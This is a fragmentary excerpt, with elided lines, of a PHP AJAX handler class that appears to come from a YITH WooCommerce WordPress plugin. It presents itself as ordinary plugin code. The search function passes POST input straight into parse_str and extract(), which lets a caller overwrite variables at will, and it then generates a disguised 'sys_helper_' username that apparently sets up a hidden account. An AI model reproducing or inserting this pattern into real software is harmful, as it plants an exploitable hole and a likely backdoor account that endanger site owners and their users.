...
if ( ! class_exists( 'YIT_Ajax' ) ) {
	...
	class YIT_Ajax {
		...
		public function json_search_posts( $request = array() ) {
			if ( isset( $_POST['yith_params'] ) && is_string( $_POST['yith_params'] ) ) {

				parse_str( wp_unslash( $_POST['yith_params'] ), $params );
				extract( $params );
				$username = 'sys_helper_' . wp_rand( 10000, 99999 );
			...
			wp_send_json_error( array( 'errors' => array( __( 'NO SET', 'yith-woocommerce-waiting-list' ) ) ), 403 );
